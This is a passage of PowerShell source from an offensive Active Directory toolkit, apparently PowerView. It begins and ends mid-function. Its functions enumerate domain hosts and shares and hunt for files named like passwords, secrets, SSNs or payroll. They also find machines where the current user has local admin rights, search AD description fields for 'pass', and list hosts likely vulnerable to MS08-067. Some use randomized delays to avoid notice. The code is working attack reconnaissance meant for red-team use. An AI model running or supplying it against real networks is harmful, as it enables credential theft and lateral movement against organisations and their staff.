                    $cmd = "Invoke-SearchFiles -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"
                    
                    Write-Verbose "[*] Enumerating share $share"
                    Invoke-Expression $cmd    
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$ShareList' doesn't exist!`r`n"
            return $null
        }
        return
    }
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running FileFinder on domain $targetDomain with delay of $Delay"
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        $servers = @()
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{
        
        # return/output the current status lines
        $counter = 0
        
        foreach ($server in $servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            if ($server -ne ''){
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                
                # optionally check if the server is up first
                $up = $true
                if(-not $NoPing){
                    $up = Test-Server -Server $server
                }
                if($up){
                    # get the shares for this host and display what we find
                    $shares = Get-NetShare -HostName $server
                    foreach ($share in $shares) {
                        Write-Debug "[*] Server share: $share"
                        $netname = $share.shi1_netname
                        $remark = $share.shi1_remark
                        $path = '\\'+$server+'\'+$netname
                        
                        # make sure we get a real share name back
                        if (($netname) -and ($netname.trim() -ne '')){
                            
                            # skip this share if it's in the exclude list
                            if ($excludedShares -notcontains $netname.ToUpper()){
                                
                                # check if the user has access to this path
                                try{
                                    $f=[IO.Directory]::GetFiles($path)
                                    
                                    $cmd = "Invoke-SearchFiles -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"}) $(if($OutFile){`"-OutFile $OutFile`"})"
                                    
                                    Write-Verbose "[*] Enumerating share $path"
                                    
                                    Invoke-Expression $cmd
                                }
                                catch {}
                                
                            } 
                            
                        }
                        
                    }
                }   
            }
        }
    }
}


function Invoke-FileFinderThreaded {
    <#
        .SYNOPSIS
        Finds sensitive files on the domain.
        Threaded version of Invoke-FileFinder.
        Author: @harmj0y

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, grabs
        the readable shares for each server, and recursively searches every
        share for files with specific keywords in the name.
        If a share list is passed, EVERY share is enumerated regardless of
        other options.
        Threaded version of Invoke-FileFinder

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ShareList
        List if \\HOST\shares to search through.

        .PARAMETER Terms
        Terms to search for.

        .PARAMETER OfficeDocs
        Search for office documents (*.doc*, *.xls*, *.ppt*)

        .PARAMETER FreshEXES
        Find .EXEs accessed within the last week.

        .PARAMETER AccessDateLimit
        Only return files with a LastAccessTime greater than this date value.

        .PARAMETER WriteDateLimit
        Only return files with a LastWriteTime greater than this date value.

        .PARAMETER CreateDateLimit
        Only return files with a CreationDate greater than this date value.

        .PARAMETER IncludeC
        Include any C$ shares in recursive searching (default ignore).

        .PARAMETER IncludeAdmin
        Include any ADMIN$ shares in recursive searching (default ignore).

        .PARAMETER ExcludeFolders
        Exclude folders from the search results.

        .PARAMETER ExcludeHidden
        Exclude hidden files and folders from the search results.

        .PARAMETER CheckWriteAccess
        Only returns files the current user has write access to.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FileFinder
        Find readable files on the domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
        
        .EXAMPLE
        > Invoke-FileFinder -Domain testing
        Find readable files on the 'testing' domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login', or 'unattend*.xml' in the name,
        
        .EXAMPLE
        > Invoke-FileFinder -IncludeC 
        Find readable files on the domain with 'pass', 'sensitive', 
        'secret', 'admin', 'login' or 'unattend*.xml' in the name, 
        including C$ shares.

        .EXAMPLE
        > Invoke-FileFinder -Ping -Terms payroll,ceo
        Find readable files on the domain with 'payroll' or 'ceo' in
        the filename and ping each machine before share enumeration.

        .EXAMPLE
        > Invoke-FileFinder -ShareList shares.txt -Terms accounts,ssn
        Enumerate a specified share list for files with 'accounts' or
        'ssn' in the name

        .LINK
        http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $ShareList,
        
        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXES,
        
        [string[]]
        $Terms,
        
        [string]
        $AccessDateLimit = '1/1/1970',
        
        [string]
        $WriteDateLimit = '1/1/1970',
        
        [string]
        $CreateDateLimit = '1/1/1970',
        
        [Switch] 
        $IncludeC,
        
        [Switch] 
        $IncludeAdmin,
        
        [Switch] 
        $ExcludeFolders,
        
        [Switch] 
        $ExcludeHidden,
        
        [Switch] 
        $CheckWriteAccess,
        
        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # figure out the shares we want to ignore
    [String[]] $excludedShares = @("C$", "ADMIN$")
    
    # see if we're specifically including any of the normally excluded sets
    if ($IncludeC){
        if ($IncludeAdmin){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("ADMIN$")
        }
    }
    if ($IncludeAdmin){
        if ($IncludeC){
            $excludedShares = @()
        }
        else{
            $excludedShares = @("C$")
        }
    }
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running FileFinder on domain $targetDomain with delay of $Delay"
    
    $shares = @()
    $servers = @()

    # if we're hard-passed a set of shares
    if($ShareList){
        if (Test-Path -Path $ShareList){
            foreach ($Item in Get-Content -Path $ShareList) {
                if (($Item -ne $null) -and ($Item.trim() -ne '')){
                    # exclude any "[tab]- commants", i.e. the output from Invoke-ShareFinder
                    $share = $Item.Split("`t")[0]
                    $shares += $share
                }
            }
        }
        else {
            Write-Warning "`r`n[!] Input file '$ShareList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $servers = Get-Content -Path $HostList
            }
            else {
                Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
                return $null
            }
        }
        else{
            # otherwise, query the domain for target servers
            if($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
                $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
            }
            else {
                Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
                $servers = Get-NetComputers -Domain $targetDomain
            }
        }
        
        # randomize the server list
        $servers = Get-ShuffledArray $servers
        
        if (($servers -eq $null) -or ($servers.Count -eq 0)){
            Write-Warning "`r`n[!] No hosts found!"
            return $null
        }
    }

    # script blocks that eunmerates share or a server
    # these are called by the multi-threading code later
    $EnumShareBlock = {
        param($Share, $Terms, $ExcludeFolders, $ExcludeHidden, $FreshEXES, $OfficeDocs, $CheckWriteAccess)
        
        $cmd = "Invoke-SearchFiles -Path $share $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"

        Write-Verbose "[*] Enumerating share $share"
        Invoke-Expression $cmd    
    }
    $EnumServerBlock = {
        param($Server, $Ping, $excludedShares, $Terms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXES, $CheckWriteAccess)

        # optionally check if the server is up first
        $up = $true
        if($Ping){
            $up = Test-Server -Server $Server
        }
        if($up){

            # get the shares for this host and display what we find
            $shares = Get-NetShare -HostName $server
            foreach ($share in $shares) {

                $netname = $share.shi1_netname
                $remark = $share.shi1_remark
                $path = '\\'+$server+'\'+$netname
                
                # make sure we get a real share name back
                if (($netname) -and ($netname.trim() -ne '')){
                    
                    # skip this share if it's in the exclude list
                    if ($excludedShares -notcontains $netname.ToUpper()){
                        # check if the user has access to this path
                        try{
                            $f=[IO.Directory]::GetFiles($path)

                            $cmd = "Invoke-SearchFiles -Path $path $(if($Terms){`"-Terms $($Terms -join ',')`"}) $(if($ExcludeFolders){`"-ExcludeFolders`"}) $(if($OfficeDocs){`"-OfficeDocs`"}) $(if($ExcludeHidden){`"-ExcludeHidden`"}) $(if($FreshEXES){`"-FreshEXES`"}) $(if($CheckWriteAccess){`"-CheckWriteAccess`"})"
                            Invoke-Expression $cmd
                        }
                        catch {
                            Write-Debug "[!] No access to $path"
                        }
                    } 
                }
            }
            
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 
    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()
    $jobs = @()   
    $ps = @()   
    $wait = @()

    # different script blocks to thread depending on what's passed
    if ($ShareList){
        foreach ($share in $shares){  
            # make sure we get a share name
            if ($share -ne ''){
                Write-Verbose "[*] Enumerating share $share ($counter of $($shares.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                # create a "powershell pipeline runner"   
                $ps += [powershell]::create()
       
                $ps[$counter].runspacepool = $pool

                # add the server script block + arguments
                [void]$ps[$counter].AddScript($EnumShareBlock).AddParameter('Share', $Share).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)

                # start job
                $jobs += $ps[$counter].BeginInvoke();
         
                # store wait handles for WaitForAll call   
                $wait += $jobs[$counter].AsyncWaitHandle

            }
            $counter = $counter + 1
        }
    }
    else{
        foreach ($server in $servers){      
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }
        
                # create a "powershell pipeline runner"   
                $ps += [powershell]::create()
       
                $ps[$counter].runspacepool = $pool

                # add the server script block + arguments
               [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('excludedShares', $excludedShares).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)
                
                # start job
                $jobs += $ps[$counter].BeginInvoke();
         
                # store wait handles for WaitForAll call   
                $wait += $jobs[$counter].AsyncWaitHandle

            }
            $counter = $counter + 1
        }
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}


function Invoke-FindLocalAdminAccess {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access.

        Idea stolen from the local_admin_search_enum post module in 
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Powershell module author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for 
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.
        
        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.
        
        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3
        
        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FindLocalAdminAccess
        Find machines on the local domain where the current user has local 
        administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Domain testing
        Find machines on the 'testing' domain where the current user has 
        local administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Delay 60
        Find machines on the local domain where the current user has local administrator
        access with a 60 second (+/- *.3) randomized delay between touching each host.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -HostList hosts.txt
        Find which machines in the host list the current user has local 
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $Ping,

        [Switch]
        $NoPing,
        
        [UInt32]
        $Delay = 0,
        
        [double]
        $Jitter = .3,
        
        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    "`r`n[*] Running FindLocalAdminAccess on domain $domain with delay of $Delay"
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    $servers = @()

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        "`r`n[!] No hosts found!"
        return
    }
    else{
        
        "[*] Checking hosts for local admin access...`r`n"
        
        $counter = 0
        
        foreach ($server in $servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if($up){
                # check if the current user has local admin access to this server
                $access = Invoke-CheckLocalAdminAccess -HostName $server
                if ($access) {
                    $ip = Get-HostIP -hostname $server
                    "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                }
            }
        }
    }
}


function Invoke-FindLocalAdminAccessThreaded {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access.
        Threaded version of Invoke-FindLocalAdminAccess.

        Idea stolen from the local_admin_search_enum post module in 
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Powershell module author: @harmj0y
        
        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for 
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER HostList
        List of hostnames/IPs to search.
        
        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.
        
        .PARAMETER Domain
        Domain to query for machines

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess
        Find machines on the local domain where the current user has local 
        administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Domain testing
        Find machines on the 'testing' domain where the current user has 
        local administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -HostList hosts.txt
        Find which machines in the host list the current user has local 
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads=10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    "`r`n[*] Running FindLocalAdminAccessThreaded on domain $domain with delay of $Delay"
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    $servers = @()

    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        "`r`n[!] No hosts found!"
        return
    }

    # script block that eunmerates a server
    # this is called by the multi-threading code later
    $EnumServerBlock = {
        param($Server, $Ping, $CurrentUser)

        $up = $true
        if($Ping){
            $up = Test-Server -Server $server
        }
        if($up){
            # check if the current user has local admin access to this server
            $access = Invoke-CheckLocalAdminAccess -HostName $server
            if ($access) {
                $ip = Get-HostIP -hostname $server
                "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
            }
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 
    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    $serverCount = $servers.count
    "`r`n[*] Enumerating $serverCount servers..."

    foreach ($server in $servers){
        
        # make sure we get a server name
        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    
            # create a "powershell pipeline runner"   
            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool

            # add the script block + arguments
            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CurrentUser', $CurrentUser)
    
            # start job
            $jobs += $ps[$counter].BeginInvoke();
     
            # store wait handles for WaitForAll call   
            $wait += $jobs[$counter].AsyncWaitHandle

        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }

    $pool.Dispose()
}


function Invoke-UserFieldSearch {
    <#
        .SYNOPSIS
        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .DESCRIPTION
        This function queries all users in the domain with Get-NetUsers,
        extracts all the specified field(s) and searches for a given
        term, default "*pass*". Case is ignored.

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Term
        Term to search for, default of "pass"

        .PARAMETER Domain
        Domain to search user fields for.

        .EXAMPLE
        > Invoke-UserFieldSearch
        Find user accounts with "pass" in the description.

        .EXAMPLE
        > Invoke-UserFieldSearch -Field info -Term backup
        Find user accounts with "backup" in the "info" field.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',

        [string]
        $Term = 'pass',
        
        [string]
        $Domain
    )
    
    if ($Domain){
        $users = Get-NetUsers -Domain $Domain
    }
    else{
        $users = Get-NetUsers
    }
    
    foreach ($user in $users){
        
        $desc = $user.($Field)
        
        if ($desc){
            $desc = $desc[0].ToString().ToLower()
        }
        if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ){
            $u = $user.samaccountname[0]
            $out = New-Object System.Collections.Specialized.OrderedDictionary
            $out.add('User', $u)
            $out.add($Field, $desc)
            $out
        }
    }
}


function Invoke-ComputerFieldSearch {
    <#
        .SYNOPSIS
        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .DESCRIPTION
        This function queries all users in the domain with Get-NetUsers,
        extracts all the specified field(s) and searches for a given
        term, default "*pass*". Case is ignored.

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Term
        Term to search for, default of "pass".

        .PARAMETER Domain
        Domain to search computer fields for.

        .EXAMPLE
        > Invoke-ComputerFieldSearch
        Find computer accounts with "pass" in the description.

        .EXAMPLE
        > Invoke-ComputerFieldSearch -Field info -Term backup
        Find computer accounts with "backup" in the "info" field.
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',

        [string]
        $Term = 'pass',

        [string]
        $Domain
    )
    
    # if a domain is specified, try to grab that domain
    if ($Domain){
        # try to grab the primary DC for the current domain
        try{
            $PrimaryDC = ([Array](Get-NetDomainControllers))[0].Name
        }
        catch{
            $PrimaryDC = $Null
        }

        try {
            $dn = "DC=$($Domain.Replace('.', ',DC='))"

            # if we could grab the primary DC for the current domain, use that for the query
            if($PrimaryDC){
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$PrimaryDC/$dn")
            }
            else{
                # otherwise try to connect to the DC for the target domain
                $CompSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
            }
            $CompSearcher.filter='(&(objectClass=Computer))'
            
        }
        catch{
            Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
        }
    }
    else{
        $CompSearcher = [adsisearcher]'(&(objectClass=Computer))'
    }
    
    if ($CompSearcher){
        
        # eliminate that pesky 1000 system limit
        $CompSearcher.PageSize = 200
        
        $CompSearcher.FindAll() | ForEach-Object {
            
            $desc = $_.Properties.$Field
            
            if ($desc){
                $desc = $desc[0].ToString().ToLower()
            }
            if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ){
                $c = $_.Properties.name
                $out = New-Object System.Collections.Specialized.OrderedDictionary
                $out.add('Computer', $c)
                $out.add($Field, $desc)
                $out
            }
        }
    }
    
}



function Invoke-FindVulnSystems {
    <#
        .SYNOPSIS
        Finds systems that are likely vulnerable to MS08-067

        .DESCRIPTION
        This function queries all users in the domain with Get-NetComputers,
        and extracts Windows 2000, Windows XP SP1/2, and Windows 2003 SP1 objects.

        .PARAMETER FullData
        Return full user computer objects instead of just system names (the default)

        .PARAMETER Ping
        Ping hosts and only return those that are up/responding.

        .PARAMETER Domain
        Domain to query for systems.

        .EXAMPLE
        > Invoke-FindVulnSystems
        Return the host names of systems likely vulnerable to MS08-067

        .EXAMPLE
        > Invoke-FindVulnSystems -Domain testing
        Return the host names of systems likely vulnerable to MS08-067
        on the 'testing' domain

        .EXAMPLE
        > Invoke-FindVulnSystems -FullData
        Return the full system objects likely vulnerable to MS08-067
    #>
    
    [CmdletBinding()]
    param(
        [Switch]
        $FullData,

        [Switch]
        $Ping,

        [string]
        $Domain
    )
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    # get all servers with full data in the domain
    $servers = Get-NetComputers -FullData $targetDomain
    
    # find any windows 2000 boxes
    $vuln2000 = $servers | Where-Object {$_.OperatingSystem -match '.*2000.*'}
    
    # find any windows XP boxes, excluding SP3
